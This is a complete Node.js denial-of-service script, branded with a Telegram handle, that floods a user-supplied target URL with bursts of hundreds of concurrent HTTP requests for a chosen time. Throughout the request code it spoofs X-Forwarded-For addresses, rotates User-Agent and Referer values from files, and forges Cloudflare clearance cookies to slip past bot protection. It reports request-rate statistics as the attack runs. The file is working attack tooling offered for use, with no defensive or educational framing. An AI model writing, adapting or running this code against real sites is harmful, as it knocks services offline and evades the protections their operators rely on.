const axios = require('axios');
const fs = require('fs');
const os = require('os');
const process = require('process');
const cliProgress = require('cli-progress');

const MAX_CONCURRENT = 777;
const REQUEST_TIMEOUT = 8000;
const BURST_DIVISOR = 3;
const BURST_DELAY_MS = 100;

function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
    } catch {
        return [];
    }
}

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = {
            total: 0,
            success: 0,
            errors: 0,
            peakRps: 0
        };
    }

    fakeClearance() {
        return Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
    }

    fakeUvid() {
        return Math.random().toString(36).slice(2, 26);
    }

    async makeRequest() {
        const headers = {
            'User-Agent': USER_AGENTS.length > 0
                ? USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
                : 'Mozilla/5.0',
            'Referer': REFERERS.length > 0
                ? REFERERS[Math.floor(Math.random() * REFERERS.length)]
                : 'https://google.com',
            'X-Forwarded-For': Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.'),
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Cookie': `cf_clearance=${this.fakeClearance()}; _cfuvid=${this.fakeUvid()}`
        };

        try {
            const response = await axios.get(this.target, {
                headers,
                timeout: REQUEST_TIMEOUT,
                validateStatus: () => true
            });
            return response.status === 200 ? 'SUCCESS' : 'ERROR';
        } catch {
            return 'ERROR';
        }
    }

    async runAttack() {
        const bar = new cliProgress.SingleBar({
            format: `SNOWYC2 - T.ME/STSVKINGDOM\n{bar} {percentage}% | RPS: {rps} | SENT: {sent} | 200 OK: {ok} | ERR: {err}`
        }, cliProgress.Presets.shades_classic);

        bar.start(this.duration / 1000, 0, {
            rps: 0,
            sent: 0,
            ok: 0,
            err: 0
        });

        const interval = setInterval(() => {
            const elapsed = Date.now() - this.startTime;
            const rps = (this.stats.total / (elapsed / 1000)).toFixed(1);
            this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
            bar.update(Math.min(this.duration / 1000, elapsed / 1000), {
                rps,
                sent: this.stats.total,
                ok: this.stats.success,
                err: this.stats.errors
            });
        }, 300);

        while (Date.now() - this.startTime < this.duration) {
            const burstSize = Math.floor(MAX_CONCURRENT / BURST_DIVISOR);
            for (let i = 0; i < BURST_DIVISOR; i++) {
                const requests = Array.from({ length: burstSize }, () => this.makeRequest());
                const results = await Promise.allSettled(requests);
                results.forEach(res => {
                    this.stats.total++;
                    if (res.status === 'fulfilled' && res.value === 'SUCCESS') {
                        this.stats.success++;
                    } else {
                        this.stats.errors++;
                    }
                });
                await new Promise(r => setTimeout(r, BURST_DELAY_MS));
            }
        }

        clearInterval(interval);
        bar.stop();
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = this.stats.total / elapsed;
        console.log('\n' + '='.repeat(60));
        console.log(`TARGET: ${this.target}`);
        console.log(`TIME:        ${elapsed.toFixed(1)}s`);
        console.log(`TOTAL:       ${this.stats.total}`);
        console.log(`SUCCESS:     ${this.stats.success}`);
        console.log(`ERRORS:      ${this.stats.errors}`);
        console.log(`AVG RPS:     ${avgRps.toFixed(1)}`);
        console.log(`PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
        console.log('='.repeat(60));
    }
}

// Main
(async () => {
    console.log('\nSNOWYC2 - T.ME/STSVKINGDOM');
    console.log('='.repeat(60));

    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("TIME (seconds): ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    const engine = new AttackEngine(target, duration);
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("Attack interrupted or failed:", err.message);
    }
})();
